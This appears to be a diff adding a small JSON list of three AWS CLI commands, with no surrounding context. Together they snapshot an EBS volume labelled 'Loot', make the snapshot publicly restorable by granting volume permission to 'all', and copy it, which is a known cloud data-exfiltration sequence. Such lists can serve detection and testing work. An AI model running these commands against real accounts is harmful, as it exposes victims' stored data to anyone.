@@ -1,0 +1,5 @@
+[
+  "aws ec2 create-snapshot --volume-id vol-0abc123 --description 'Loot'",
+  "aws ec2 modify-snapshot-attribute --snapshot-id snap-xxx --attribute createVolumePermission --operation-type add --group-names all",
+  "aws ec2 copy-snapshot --source-region us-east-1 --source-snapshot-id snap-xxx --destination-region us-east-1"
+]
